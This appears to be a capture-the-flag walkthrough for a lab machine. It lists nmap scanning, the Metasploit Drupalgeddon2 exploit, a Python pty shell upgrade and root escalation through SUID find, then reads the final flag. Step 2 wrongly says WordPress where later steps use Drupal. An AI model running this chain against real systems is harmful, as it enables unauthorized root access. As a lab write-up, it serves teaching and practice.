1. -> nmap -sn 192.168.56.0/24
   ( Let's start with a network scan to find out the IP address of target machine.)


2. -> nmap -sV -A  192.168.56.108
   ( Now, we need to find out the running services on the target machine. And, from the nmap scan we found that a wordpress web is hosted over the target machine.)


3. -> msfconsole 
   -> search drupal
   ( As we’ve seen that drupal site is running on the target machine, we’ll use metasploit-framework to exploit the targeted machine. To exploit we need a msf exploit, so we will search for an exploit for drupal site.)


4. -> use exploit/unix/webapp/drupal_drupalgeddon2
   -> set rhosts 192.168.56.108
   -> run
   ( Here we’ve used “exploit/unix/webapp/drupal_drupalgeddon2” exploit, set rhosts(target host) to targeted machine and run the exploit.)


5. -> shell
   -> python -c 'import pty;pty.spawn("/bin/bash")'
   ( After getting meterpreter try to get a proper shell.)

 
6. -> find / -perm -u=s -type f 2>/dev/null
   ( After getting a proper shell we have to find executable commands which could be executed
by user.)


7. -> find . -exec /bin/sh \; -quit
   ( Since user have the permissions to run find command, we are able to execute “/bin/bash” and spawn a shell as a root user.)


8. -> cd /root
   -> ls 
   -> cat thefinalflag.txt
